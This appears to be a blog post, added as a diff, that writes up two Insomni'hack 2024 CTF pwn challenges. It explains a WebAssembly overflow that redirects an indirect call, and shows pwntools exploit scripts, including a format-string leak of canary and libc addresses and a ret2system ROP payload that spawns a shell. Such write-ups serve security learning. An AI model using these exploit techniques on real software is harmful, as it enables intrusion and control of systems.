@@ -1,0 +1,398 @@
+---
+title: "Insomni'hack Teaser Writeup 2024"
+date: "2024-01-24"
+tags: ['Writeup', 'Pwn']
+draft: false
+summary: "In this weekend, I solved a interesting memory corruption vulnerability in WebAssembly binary."
+---
+
+In this weekend, I solved a interesting memory corruption vulnerability in WebAssembly binary.
+
+
+
+## Pwn
+
+### Tinderbox
+
+>My friend is not a great developer but he insisted to work on a prototype in C. He said he compiled the program to WebAssembly and "it is super secure" but I am doubtful.
+
+The challenge provides a wasm binary which claimed is written in C and compiled to WebAssembly. We can run the binary on standalone WebAssembly like `wasmtime`.
+
+```
+jackfromeast@xxx:~/Desktop/insomin-ctf/tinderbox$ wasmtime bin.wasm 
+Tell me your name:helloworld
+Hello, what do you want to do?
+1 - I made a typo in my name!
+2 - Do some math for me.
+3 - Tell me a joke!
+1
+Sorry, due to a technical limitation, I can only fix your first letter. What value do you want there?
+23
+Hello, what do you want to do?
+1 - I made a typo in my name!
+2 - Do some math for me.
+3 - Tell me a joke!
+3
+Sorry not today.
+Bye!
+
+ elloworld - 3 is gone
+```
+
+There are several approaches to disassembly/discompile the wasm binary. However, after trying out the online disassemblers and the tools in `wabt` (i.e. `wasm2c`, `wasm2wat`), I found the `ghidra-wasm-plugin` plugin provides the most readable code.
+
+**Goal: Hijacking control flow through indirect function call**
+
+Upon examining the decompiled binary, I found a function named `win` which indicating that this challenge requires us exploit the memory corruption vulnerability and hijack the control flow to this function. 
+
+Then, in the `menu` function, I found the program uses indirect function call to invoke different functions based on user's input. 
+
+![](/static/images/insomni-hack-2024-Writeup/tinderbox-indirect-function-call.jpg)
+
+And if we go to the `.table0` section, it is also very suspicious as the `win` function resides at offset `0x8`. Furthermore, within the `menu` function, there are calls to functions at offsets `0x4` and `0xC`.  Therefore, it gives us the sense that we need to alter the value of `local_4`, specifically by decreasing it by four. 
+
+![](/static/images/insomni-hack-2024-Writeup/tinderbox-table0.jpg)
+
+**Buffer-Overflow in C and WebAssembly**
+
+In the `get_name` function, there seems a buffer overflow vulnerability in the decompiled C code.
+
+![](/static/images/insomni-hack-2024-Writeup/tinderbox-bof.jpg)
+
+However, Buffer overflow vulnerabilities are well-understood within the context of `x86_64` or `x86` assembly code and ABI (calling convention, type layout, stack and register usage, and more), particularly in terms of how assembly code interacts with memory spaces (like stack and other segments) and registers. However, the landscape changes when we shift our focus to WebAssembly, a distinct virtual machine environment with unique behaviors. In WebAssembly, a buffer overflow vulnerability might manifest differently in the memory layout compared to the C compiled assembly code, where it typically results in the corruption of stack or heap chunks.
+
+Therefore, we need to understand the WebAssembly virtual machine in more details regarding its instructions, runtime memory layout, calling conventions, binary sections, etc., so that we can know which parts of the memory will be overflowed and write the exploit.
+
+**WebAssembly Basics**
+
+The WebAssembly programs are organized into *modules*, which contain *funcs*, *tables*, *mems*, *globals*, etc. A *table* is a vector (in other word, array) of opaque values of a particular [reference type](https://webassembly.github.io/spec/core/syntax/types.html#syntax-reftype). A memory is a vector of raw uninterpreted bytes. The *global* is  a vector of global variables. The *funcs* component comes with a *type*, *locals* and *body*, which *locals* declare a vector of mutable local variables and their types and *body* is an instruction sequences. 
+
+****
+
+In short, when we execute instructions in a function, it can access data stored in *tables*, *mems*, *globals*, *locals*. Besides, WebAssembly VM is a stack-based virtual machine where instructions manipulate values on an implicit *operand stack*, consuming (popping) argument values and producing or returning (pushing) result values.
+
+****
+
+For other modules in the WebAssembly program, please refer to the [official document](https://webassembly.github.io/spec/core/syntax/modules.html).
+
+There are eight group of instructions:
+
+1. Numeric Instructions
+
+    + i32.const *immediate* (i64.const, f32.const, f64.const)
+
+        + push a const immediate value into the stack
+
+        + ```
+            bytecode:
+            ...][ i32.const ][ 123 ][...
+            
+            stack:
+            |           |          |           | 
+            |           |         ➘|  123(i32) |
+            |     d     |          |     d     |
+            |     c     |          |     c     | 
+            |     b     |          |     b     |  
+            |     a     |          |     a     | 
+            └───────────┘          └───────────┘
+            ```
+
+    + i64.eqz
+
+        + pop a operand on the stack and check whether it equals to zero, and return the result to the stack
+
+            ```
+            bytecode:
+            ...][ i64.eqz ][...
+            
+            stack:
+            |           |          |           | 
+            |           |          |           |
+            |   d(i64)  |➚        ➘| d==0(i32) |
+            |     c     |          |     c     | 
+            |     b     |          |     b     |  
+            |     a     |          |     a     | 
+            └───────────┘          └───────────┘
+            ```
+
+    + i64.lt_s (eq, ne, le, gt, le, ge)
+
+        + pop two operands and push the comparison results back to the stack
+
+    + etc.
+
+2. Vector Instructions
+
+3. Reference Instructions
+
+4. Parametric Instructions
+
+5. Variable Instructions
+
+    + local.get *localidx*
+    + local.set *localidx*
+    + local.tee *localidx*
+    + global.get *globalidx*
+    + global.set *globalidx*
+
+6. Table Instructions
+
+7. Memory Instructions
+
+    + memory.size
+        + returns the current size of a memory and push to the stack
+    + memory.grow
+        + grows memory by a given delta and returns the previous size
+
+    + load *memarg*
+
+        + specify different number types (storage size): i32.load, i64.load, etc.
+
+        + pop the first value on the stack as base address and takes a memory immediate memarg: address *offset* and the expected *alignment*
+
+        + e.g. 80004b4a 28 02 2c        i32.load   align=0x2 offset=0x2c
+
+        + ```
+            bytecode:
+            ...][ i64.load ][ align ][ offset ][...
+            
+            stack:
+            |           |          |           | 
+            |           |          |           | 
+            |   d(i32)  |➚        ➘|m[offset+d]| # i64
+            |     c     |          |     c     | 
+            |     b     |          |     b     |  
+            |     a     |          |     a     | 
+            └───────────┘          └───────────┘
+            ```
+
+    + store *memarg*
+
+        + specify different number types (storage size): i32.store, i64.store, etc.
+
+        + pop the first value on the stack as the value to be assigned and the second value as base address and takes a memory immediate memarg: address *offset* and the expected *alignment*
+
+        + e.g. 80004ae6 36 02 40        i32.store  align=0x2 offset=0x40
+
+            ```
+            bytecode:
+            ...][ i64.store ][ align ][ offset ][...
+            
+            stack:
+            |           |          |           | 
+            |   e(i64)  |➚         |           | 
+            |   d(i32)  |➚         |           | # m[offset+d]=e
+            |     c     |          |     c     | 
+            |     b     |          |     b     |  
+            |     a     |          |     a     | 
+            └───────────┘          └───────────┘
+            ```
+
+8. Control Instructions
+
+    + call *functionidx*
+        + consume the necessary arguments from the stack and return the result values of the call to the stack. 
+        + no pre- or post- prologue to build a stack frame and also no ret address
+    + call_indirect *tableidx* *typeidx*
+        + calls a function indirectly through an operand indexing into a table that is denoted by a table index and must have type *funcref*. 
+
+I refer this [documents](https://webassembly.github.io/spec/core/syntax/instructions.html#) for further documents on commonly used instructions. And some of the examples come from this [link](https://juejin.cn/post/6844904069186715656?from=search-suggest). 
+
+**Memory corruption in WebAssembly**
+
+From the above description, we know that the implicit operands stack doesn't contain the ret address which cannot be overwritten directly. However, we may overwrite other data, e.g. the function index used in the `call_indirect` instruction.
+
+Looking at the offset of the function index on the stack in the `menu` function, we found the index will be loaded from the value saved in `local_4`  (`menu` function's `stackpointer - 0x4`) with another` 0x4` bytes as offset.
+
+![](/static/images/insomni-hack-2024-Writeup/tindexbox-index.jpg)
+
+And that stack address has been set with `l0` local variable at the beginning of the function. In WebAssembly, the function arguments are the first local variables (`l0`, `l1`, ... ,`l_args`).
+
+```
+total locals = function arguments + local variables.
+first local variable index = num function arguments + 0
+// refer to https://github.com/WebAssembly/design/issues/1037
+```
+
+![](/static/images/insomni-hack-2024-Writeup/tinderbox-index-2.jpg)
+
+Therefore, we want to overwrite the first argument of the `menu` function. Tracing back to the `original_main` which call the `menu` function, we found it locates at the `stackpointer-0x28` place, which should be our target address.
+
+![](/static/images/insomni-hack-2024-Writeup/tinderbox-menu-arg.jpg)
+
+Since we already identify a buffer-overflow vulnerability in the `get_name` function, can we use the vulnerability to overflow the target address?
+
+In the `get_name` function, our input value will be saved from address saved in variable `l3` (the `get_name` function's `stackpointer-0x10`). However, `local_10` has been assigned with the value in `local_4` before the `scanf` function call and `local_4` is the `l0` which is the first argument of the function `get_name`. Therefore, the input value will be written from address that saved in the first argument which is `__original_main` function's `stackpointer - 0x18`.
+
+```
+                             get_name                                        XREF[1]:     __original_main:80000999(c)  
+    ram:800004ec 01              .locals
+    ram:800004ed 0b 7f           .local     count=0xb type=0x7f
+    ram:800004ef 23 80 80        global.get __stack_pointer
+                 80 80 00
+    ram:800004f5 21 01           local.set  l1
+    ram:800004f7 41 10           i32.const  0x10
+    ram:800004f9 21 02           local.set  l2
+    ram:800004fb 20 01           local.get  l1
+    ram:800004fd 20 02           local.get  l2
+    ram:800004ff 6b              i32.sub
+    ram:80000500 21 03           local.set  l3=>local_10
+    ram:80000502 20 03           local.get  l3=>local_10
+    ram:80000504 24 80 80        global.set __stack_pointer
+                 80 80 00
+    ram:8000050a 20 03           local.get  l3
+    ram:8000050c 20 00           local.get  l0
+    ram:8000050e 36 02 0c        i32.store  align=0x2 offset=0xc=>local_4
+
+	...
+    ram:80000540 20 03           local.get  l3
+    ram:80000542 28 02 0c        i32.load   align=0x2 offset=0xc=>local_4
+    ram:80000545 21 08           local.set  l8
+    ram:80000547 20 03           local.get  l3
+    ram:80000549 20 08           local.get  l8
+    ram:8000054b 36 02 00        i32.store  align=0x2 offset=0x0=>local_10
+    ram:8000054e 41 a6 88        i32.const  0x426
+                 80 80 00
+    ram:80000554 21 09           local.set  l9
+    ram:80000556 20 09           local.get  l9
+    ram:80000558 20 03           local.get  l3
+    ram:8000055a 10 cb 80        call       scanf                               
+                 80 80 00
+
+```
+
+So, it is clear that we can overflow the buffer from `__original_main` function's `stackpointer-0x18`, however, our target is `stackpointer-0x28`. As we can only overflow to upper addresses, it seems impossible to overwrite the function index.
+
+**Close the game: BoF2OOB**
+
+It not always be plain sailing. We should always never gave up and think about what we are able to do on the current stage and try to a step forward towards our goal. Currently, we fully control the values before the `local_18` of `__original_main`.
+
+There is another functionality provided by the program to change the first character of the name string. The `param3` is passed by user which is fully under control and param1 points to the address of the input name which is the stack address: `local_18` of `__original_main`. Can we manipulate the index `param2`, which is always zero, to something smaller than zero and achieve a out-of-bound write?
+
+![](/static/images/insomni-hack-2024-Writeup/tinderbox-setValues.jpg)
+
+Luckily, when I tracking all the way back, I found the value is passed from the fourth argument of `menu` function. As the `local_8` can be overwritten by the buffer overflow vulnerability, we can other write it to `-12`.
+
+```
+menu(&local_28,&local_18,2,&local_8,local_2c);
+```
+
+**Final Exploit**
+
+```
+from pwn import *
+
+p = remote("tinderbox.insomnihack.ch" , 7171)
+
+p.sendlineafter(b"name:", b'A'*0x10+p32(-12 & 0xffffffff))
+p.sendlineafter(b'joke!\n', b'1')
+p.sendlineafter(b'?\n', str(2))
+p.sendlineafter(b'joke!\n', b'3')
+
+p.interactive()
+p.close()
+```
+
+*Vulnerability never disappears, but lives in a different format ;)*
+
+
+
+### Vaulty
+
+> Everybody needs a password manager.
+
+The problem has two vulnerabilities that are easy to take advantage of.
+
+1. buffer-overflow in create-vaulty URL field
+2. format-string vulnerability in the print-vaulty place.
+
+However, I found that the binary itself doesn't provide the `pop rdi; ret;` gadget which indicating that we cannot build rop chain with the code in the binary itself before leaking the glibc's address.
+
+Overall, the solution has like two steps:
+
+1. leak the canary/PIE base addr/libc base addr using the format-string vulnerability
+2. build the rop chain and ret2system using the bof vulnerability.
+
+**locate the args offset of fmt**
+
+![vaulty-stack-frame](/static/images/insomni-hack-2024-Writeup/vaulty-stack-frame.jpg)
+
+```
+[*] raw leak: b'AAAA0x7fffffffb520(nil)0x7ffff7d14a370xa(nil)0x7fffffffda700x7fffffffd6900x555558940x7fffffffd6900xa30ffd0400x7208bf19a8b354000x7fffffffda700x555555555984Password: p\n'
+```
+
+If we match the stack frame, we can find that the canary value is located at the 11th arguments of the printf function. Similarly, we can easily leak the ret address which should be the address in the text segment and help me compute the PIE base address.
+
+Also, there is also a pointer on the stack points to the return pc of function `__libc_start_main` which is in the glibc segment. Here is the classic memory pivoting picture.
+
+![mem_region_pivoting](/static/images/insomni-hack-2024-Writeup/mem_region_pivoting.png)
+
+```
+sh = start()
+canary = 0
+pie_base_addr = 0
+libc_base_addr = 0
+
+def menu(idx):
+    sh.recvuntil(b"Enter your choice (1-5):")
+    sh.sendline(str(idx))
+
+def create(username, password, url):
+    menu(1)
+    sh.recvuntil(b"Username:")
+    sh.sendline(username)
+    sh.recvuntil(b"Password:")
+    sh.sendline(password)
+    sh.recvuntil(b"URL:")
+    sh.sendline(url)
+
+def print_vault(idx):
+    menu(4)
+    sh.recvuntil(b"Select an entry to view")
+    sh.sendline(str(idx))
+    sh.recvuntil(b"Username: ")
+    raw_leak = sh.recvline()
+    log.info(f"raw leak: {raw_leak}")
+
+    return raw_leak
+
+def leak_addrs():
+    # canary offset of fmtstr args: 11
+    # ret addr offset of fmtstr args: 13 (PIE base + 0x1984)
+    # glibc addr offset of fmtstr args: 141 (glibc base + 0x29d90)
+    # 0x7fffffffda78 - 0x00007fffffffd668
+    create(b"AAAA%11$p%13$p%141$p", b"BEADBEAF", b'BEADBEAF')
+    raw_leaks = print_vault(0)
+
+    global canary, pie_base_addr, glibc_base_addr
+    canary = get_leaked_addr(raw_leaks, 4, 22)
+    pie_base_addr = get_leaked_addr(raw_leaks, 22, 36) - 0x1984
+    glibc_base_addr = get_leaked_addr(raw_leaks, 36, -1) - 0x29d90
+
+    log.info(f"leak the canary: {hex(canary)}")
+    log.info(f"leak the pie base addr: {hex(pie_base_addr)}")
+    log.info(f"leak the glibc base addr: {hex(glibc_base_addr)}")
+```
+
+**ret2system**
+
+After leaking all the necessary addresses and value (i.e. canary), we can build the rop chain and return to the system.
+
+```
+def ret2system():
+
+    rop = ROP(glibc)
+    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] + glibc_base_addr
+    ret = (rop.find_gadget(['ret']))[0] + glibc_base_addr
+    log.info(f"pop rdi gadget: {hex(pop_rdi)}")
+
+    system_addr = glibc_base_addr + glibc.symbols['system']
+    binsh_addr = glibc_base_addr + next(glibc.search(b"/bin/sh"))
+
+    payload = b'A'*0x28 + p64(canary) + b'B'*0x10 + p64(0xdeadbeaf)
+    payload += p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)
+    log.info(f"payload: {payload}")
+
+    create(b"DDDDDDDD", b"CCCCCCCC", payload)
+```
+
